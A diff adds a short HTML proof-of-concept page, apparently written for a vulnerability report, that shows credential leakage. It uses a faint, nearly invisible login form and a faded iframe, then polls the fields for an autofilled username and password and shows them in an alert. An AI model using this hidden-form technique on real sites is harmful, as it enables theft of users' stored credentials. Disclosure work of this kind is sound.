@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>PoC</title>
+</head>
+<body>
+	<script>
+		onload = () => {
+			let timer = setInterval(()=>{
+				try {
+					document.getElementsByTagName("iframe")[0].style = "opacity: 0.2";
+					let password = document.getElementsByName("password")[0].value;
+					let username = document.getElementsByName("username")[0].value;
+					if (password) {
+						alert(`Leaked credentials: ${username} / ${password}`);
+						clearInterval(timer);
+					}
+				} catch(err) {}
+			}, 100);
+		}
+	</script>
+	<div style="opacity: 0.2">
+		<form action="/login" method="post">
+		  <div class="container">
+		    <input type="text" name="username" required>
+		    <input type="password" name="password" required>
+		    <button type="submit">Login</button>
+		  </div>
+		</form>
+	</div>
+</body>
+</html>
